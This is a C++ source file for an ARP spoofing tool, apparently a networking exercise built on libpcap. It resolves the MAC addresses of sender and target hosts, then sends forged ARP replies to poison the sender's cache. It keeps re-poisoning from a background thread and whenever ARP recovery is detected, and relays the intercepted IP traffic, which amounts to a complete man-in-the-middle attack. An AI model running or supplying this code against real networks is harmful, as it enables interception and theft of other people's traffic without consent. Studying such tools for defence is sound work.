#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <net/if_arp.h>
#include <pthread.h>
#include <time.h>
#include <sched.h>
#include "ethhdr.h"
#include "arphdr.h"



#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
struct EthIPPacket {
    EthHdr eth_;
    ip ip_;
};
#pragma pack(pop)
struct Args{
    int tid;
    char sip[17];
    char tip[17];
}Args;

char errbuf[PCAP_ERRBUF_SIZE];
pcap_if_t* dev;


void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1 192.168.0.3 192.168.0.1\n");
}



uint8_t lcmac[6];
uint32_t lcip = 0;
void getAddrs(){
    struct ifreq ifr;

    int s;


    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("Socket open failed");
        exit(-1);
    }
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev->name , sizeof(dev->name) -1);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        printf("Error occured during ioctl().");
        exit(-1);
    } else {
        memcpy(lcmac,ifr.ifr_hwaddr.sa_data ,6 );
        printf("%s's MAC Address : %s\n", ifr.ifr_name,
               std::string((Mac)lcmac).c_str() );
    }
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error occured during ioctl().");
        exit(-1);
    } else {
        memcpy(&lcip,ifr.ifr_addr.sa_data+2,4);
        printf("Local IP Address : %s\n", std::string((Ip)htonl(lcip)).c_str());
    }

    close(s);
}

void* keepPoisoning(void* packet){
    pcap_t* handle = pcap_open_live(dev->name, BUFSIZ, 1, 100, errbuf);

    while(true){
        sleep(20);
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "Keep poisoning pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("\n\nKeep poisoning ARP Spoofing Packet Sended.\n");
    }

    pcap_close(handle);

    return NULL;

}

/* Get ARP table using ioctl().
 *
 *
struct arpreq areq;
struct sockaddr_in *sin;
struct in_addr ipaddr;

sin = (struct sockaddr_in *) &areq.arp_pa;
sin->sin_family = AF_INET;

if (inet_aton(args->tip, &ipaddr) == 0) {
    fprintf(stderr, "Invalid target IP : %s \n",args->tip);
    exit(-1);
}

sin->sin_addr = ipaddr;
sin = (struct sockaddr_in *) &areq.arp_ha;
sin->sin_family = ARPHRD_ETHER;

strncpy(areq.arp_dev, dev->name, sizeof(dev->name) -1);

if (ioctl(s, SIOCGARP, (caddr_t) &areq) == -1) {
    perror("Error occured during ioctl().");
    exit(-1);
} else {
    strncpy(mac, std::string(Mac((uint8_t*)areq.arp_ha.sa_data)).c_str(), 17);
    printf("Target MAC Address : %s\n", mac );
}
*/

void* arpSpoof(void* p){

    struct Args* args = (struct Args*)p;

    pcap_t* handle = pcap_open_live(dev->name, BUFSIZ, 1, 100, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "thread : %d couldn't open device %s(%s)\n", args->tid, dev->name, errbuf);
        exit(-1);
    }
    EthArpPacket packet;

    packet.eth_.smac_ = lcmac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.smac_ = lcmac;


    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.sip_ = lcip;
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");


    packet.arp_.tip_ = htonl(Ip(args->tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "thread : %d pcap_sendpacket return %d error=%s\n", args->tid, res, pcap_geterr(handle));
    }
    printf("\n\nthread : %d ARP Request Packet Sended to Target.\n", args->tid);




    uint8_t tmac[6];
    while (true) {
        sched_yield();
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        //printf("%u bytes captured\t", header->caplen);



        EthArpPacket *rcvpkt;

        rcvpkt = (struct EthArpPacket*)pkt;



        if(rcvpkt->eth_.type_ == htons(EthHdr::Arp)){
            printf("\nthread : %d ARP packet captured.\n", args->tid);
            if(rcvpkt->arp_.op_ == htons(ArpHdr::Reply)){
                printf("thread : %d ARP Reply packet captured.\n", args->tid);
                if(rcvpkt->arp_.sip_ == (Ip)htonl(Ip(args->tip))) {
                    memcpy(tmac,rcvpkt->arp_.smac_ ,6 );
                    printf("thread : %d ARP Reply from target captured!\nTarget MAC :%s\n", args->tid,std::string((Mac)tmac).c_str());
                    break;

                }

            }

        }


    }

    packet.arp_.tip_ = htonl(Ip(args->sip));

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "thread : %d pcap_sendpacket return %d error=%s\n", args->tid, res, pcap_geterr(handle));
    }
    printf("\n\nthread : %d ARP Request Packet Sended to Sender.\n", args->tid);

    uint8_t smac[6];
    while (true) {
        sched_yield();
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("thread : %d pcap_next_ex return %d(%s)\n", args->tid, res, pcap_geterr(handle));
            break;
        }

        //printf("%u bytes captured\t", header->caplen);



        EthArpPacket *rcvpkt;

        rcvpkt = (struct EthArpPacket*)pkt;



        if(rcvpkt->eth_.type_ == htons(EthHdr::Arp)){
            printf("\nthread : %d ARP packet captured.\n", args->tid);
            if(rcvpkt->arp_.op_ == htons(ArpHdr::Reply)){
                printf("thread : %d ARP Reply packet captured.\n", args->tid);
                if(rcvpkt->arp_.sip_ == (Ip)htonl(Ip(args->sip))) {
                    memcpy(smac,rcvpkt->arp_.smac_ ,6 );
                    printf("thread : %d ARP Reply from target captured!\nSender MAC :%s\n", args->tid, std::string((Mac)smac).c_str());
                    break;

                }

            }

        }


    }




    packet.eth_.dmac_ = smac;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.sip_ = htonl(Ip(args->tip));
    packet.arp_.tmac_ = smac;


    int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res2 != 0) {
        fprintf(stderr, "thread : %d pcap_sendpacket return %d error=%s\n", args->tid, res, pcap_geterr(handle));
    }
    printf("\n\nthread : %d ARP Spoofing Packet Sended.\n", args->tid);


    pthread_t p_thread;
    int tid;
    int stat;
    if ((tid = pthread_create(&p_thread, NULL, keepPoisoning, (void *)&packet)) < 0)
    {
        perror("Failed to create pthread.");
        exit(-1);
    }









    time_t timer;


    while (true) {
        sched_yield();
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("thread : %d pcap_next_ex return %d(%s)\n", args->tid, res, pcap_geterr(handle));
            break;
        }

        //printf("%u bytes captured\t", header->caplen);



        EthIPPacket *spoofed;

        spoofed = (struct EthIPPacket*)pkt;
        spoofed->eth_.smac_ = packet.eth_.smac_;
        spoofed->eth_.dmac_ = tmac;



        EthArpPacket *rcvpkt;

        rcvpkt = (struct EthArpPacket*)pkt;




        if(spoofed->eth_.type_ == htons(EthHdr::Ip4)){


            if( (spoofed->ip_.ip_dst.s_addr != htonl(Ip(lcip)))  &&  (spoofed->ip_.ip_src.s_addr == htonl(Ip(args->sip)))) {
                timer = time(NULL);
                printf("\nthread : %d Time : %d sec\tSpoofed packet captured.\n", args->tid, (int)timer);


                int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofed), header->caplen);
                if (res2 != 0) {
                    fprintf(stderr, "thread : %d pcap_sendpacket return %d error=%s\n", args->tid, res, pcap_geterr(handle));
                }else{
                    printf("thread : %d Relay Packet sended!\n\n\n", args->tid);
                }
            }
        }
        else if(rcvpkt->eth_.type_ == htons(EthHdr::Arp)){
            if(  (  (rcvpkt->arp_.op_ == htons(ArpHdr::Request)) &&
                    ( (rcvpkt->arp_.sip_ == (Ip)htonl(Ip(args->sip)))
                      ||   (rcvpkt->arp_.sip_ == (Ip)htonl(Ip(args->tip)))  ) ))
            {
                printf("\n\n\t\tthread : %d ARP recovery detected.\n", args->tid);

                int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                if (res2 != 0) {
                    fprintf(stderr, "thread : %d pcap_sendpacket return %d error=%s\n", args->tid, res, pcap_geterr(handle));
                }
                printf("\t\tthread : %d ARP Spoofing Packet Sended.\n\n\n", args->tid);



            }

        }

    }

    pthread_join(p_thread, (void **) &stat);
    printf("Thread end stat : %d\n", stat);
    free(p);
    pcap_close(handle);

    return NULL;

}


int main(int argc, char* argv[]) {
    if (argc%2 == 1 || argc == 2) {
        usage();
        return -1;
    }

    pcap_if_t* alldevsp;

    if(pcap_findalldevs(&alldevsp, errbuf) == -1){
        fprintf(stderr, "pcap_findalldevs return nullptr - %s\n",errbuf);
        return -1;
    }

    for(dev = alldevsp; dev; dev=dev->next){
        printf("%s\n", dev->name);
        if(strncmp(dev->name, argv[1], strlen(dev->name))==0)
            break;
    }

    if(dev == nullptr){
        fprintf(stderr, "No matching network interface '%s'.\n", argv[1]);
        return -1;
    }

    getAddrs();

    int n = argc/2 -1;
    pthread_t p_thread[n];
    int tid;
    int stat;


    for(int i = 0; i < n;  i++){
        struct Args* funcArgs;
        funcArgs = (struct Args*)malloc(sizeof(struct Args));
        funcArgs->tid = i;
        funcArgs->sip[16] ='\0';
        funcArgs->tip[16] ='\0';
        strncpy(funcArgs->sip, argv[2*i+2], 16);
        strncpy(funcArgs->tip, argv[2*i+3], 16);
        if ((tid = pthread_create(&p_thread[i], NULL, arpSpoof, (void *)funcArgs)) < 0)
        {
            perror("Failed to create pthread.");
            return -1;
        }
    }




    for(int i = 0; i<n; i++){
        pthread_join(p_thread[i], (void **) &stat);
        printf("Thread end stat : %d\n", stat);
    }



}
